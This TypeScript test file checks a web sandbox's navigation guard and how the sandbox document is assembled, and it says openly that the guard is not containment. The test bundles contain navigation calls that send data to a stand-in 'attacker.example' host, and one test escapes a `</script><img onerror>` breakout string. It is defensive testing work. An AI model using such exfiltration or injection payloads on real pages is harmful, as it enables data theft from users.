import { afterEach, expect, test } from 'vitest';

import {
  SURFACE_SANDBOX_NAV_GUARD_JS,
  buildSandboxDocument,
  wrapBundleSource,
} from './document';

/**
 * The in-realm navigation guard is bar-raising, not containment — see the
 * header comment in document.ts. These tests pin exactly what it
 * does (the bare `location` identifier inside the bundle is inert, and
 * `window.open` is replaced) and, just as importantly, what it does NOT
 * do (a `location` reached through `window`/`globalThis` is untouched).
 * The browser-level measurement lives in
 * `apps/tlon-web/sandbox-posture/navigation.spec.ts`.
 */

type Probe = Record<string, unknown>;

/**
 * Runs wrapped bundle source the way the document does: as a classic,
 * non-strict script whose `this` is the global object.
 */
function runWrapped(bundleSource: string): Probe {
  runScript(wrapBundleSource(bundleSource));
  return (globalThis as unknown as { __probe: Probe }).__probe;
}

function runScript(source: string): void {
  // eslint-disable-next-line no-eval
  const indirectEval = eval;
  indirectEval(source);
}

afterEach(() => {
  delete (globalThis as unknown as { __probe?: Probe }).__probe;
  delete (globalThis as unknown as { window?: unknown }).window;
});

test('the bundle sees a neutered `location`: navigation members are no-ops', () => {
  const probe = runWrapped(`
    globalThis.__probe = {
      replaceReturned: location.replace('https://attacker.example/?stolen=1'),
      assignReturned: location.assign('https://attacker.example/?stolen=1'),
      hrefAfterAssignment: (function () {
        location.href = 'https://attacker.example/?stolen=1';
        return location.href;
      })(),
      hash: location.hash,
    };
  `);

  expect(probe.replaceReturned).toBeUndefined();
  expect(probe.assignReturned).toBeUndefined();
  // the setter swallowed it; the getter still reports nothing
  expect(probe.hrefAfterAssignment).toBe('');
  expect(probe.hash).toBe('');
});

test('the guard replaces `window.open` — the one writable member', () => {
  const win = { open: () => 'REAL-POPUP' };
  (globalThis as unknown as { window: unknown }).window = win;

  runScript(SURFACE_SANDBOX_NAV_GUARD_JS);

  expect(win.open()).toBeNull();
});

test('the shadow is one property access deep — `window.location` is untouched', () => {
  // the point of this test is to REFUSE to claim containment: a bundle
  // that reaches location through any object reference gets the real one
  const real = {
    replace: () => 'REAL-NAVIGATION',
  };
  (globalThis as unknown as { window: unknown }).window = { location: real };

  const probe = runWrapped(`
    globalThis.__probe = {
      viaWindow: window.location.replace('https://attacker.example/?stolen=1'),
      viaGlobalThis: globalThis.window.location.replace('https://attacker.example/?stolen=1'),
      shadowedIsNotReal: location !== window.location,
    };
  `);

  expect(probe.viaWindow).toBe('REAL-NAVIGATION');
  expect(probe.viaGlobalThis).toBe('REAL-NAVIGATION');
  expect(probe.shadowedIsNotReal).toBe(true);
});

test('wrapping preserves top-level `this` and the surrounding globals', () => {
  const probe = runWrapped(`
    globalThis.__probe = {
      thisIsGlobal: this === globalThis,
      reachesOuterGlobals: typeof Object.freeze === 'function',
    };
  `);

  expect(probe.thisIsGlobal).toBe(true);
  expect(probe.reachesOuterGlobals).toBe(true);
});

test('the guard runs before the shell, and the shell before the bundle', () => {
  const doc = buildSandboxDocument({
    shellJs: 'SHELL_MARKER;',
    shellCss: '.x{}',
    bundleSource: 'BUNDLE_MARKER;',
  });

  const guardAt = doc.indexOf(SURFACE_SANDBOX_NAV_GUARD_JS.trim().slice(0, 24));
  const shellAt = doc.indexOf('SHELL_MARKER');
  const bundleAt = doc.indexOf('BUNDLE_MARKER');

  expect(guardAt).toBeGreaterThan(-1);
  expect(guardAt).toBeLessThan(shellAt);
  expect(shellAt).toBeLessThan(bundleAt);
  // and the bundle — only the bundle — is the wrapped one
  expect(doc).toContain(wrapBundleSource('BUNDLE_MARKER;'));
});

test('`</script` stays inert in the wrapped bundle', () => {
  const doc = buildSandboxDocument({
    shellJs: '',
    shellCss: '',
    bundleSource: `var s = '</script><img onerror=1>';`,
  });
  expect(doc).not.toContain('</script><img');
  expect(doc).toContain('<\\/script><img');
});
